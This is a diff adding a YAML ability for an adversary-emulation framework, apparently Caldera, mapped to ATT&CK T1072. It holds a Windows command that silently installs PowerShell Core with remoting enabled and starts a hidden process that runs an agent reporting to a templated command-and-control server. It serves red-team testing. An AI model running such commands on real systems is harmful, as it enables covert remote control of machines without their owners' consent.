@@ -1,0 +1,18 @@
+---
+
+- id: 60f63260-39bb-4136-87a0-b6c2dca799fc
+  name: Install PowerShell Core 6
+  description: Download, install and switch shell to PowerShell Core 6
+  tactic: execution
+  technique:
+    attack_id: T1072
+    name: Third-party Software
+  platforms:
+    windows:
+      psh:
+        command: |
+          msiexec.exe /package PowerShell-6.2.2-win-x64.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1;
+          Start-Process powershell -ArgumentList "pwsh -c #{location} -server #{server} -group #{group} -executor pwsh" -WindowStyle hidden;
+        cleanup: |
+          rm PowerShell-6.2.2-win-x64.msi;
+        payload: PowerShell-6.2.2-win-x64.msi
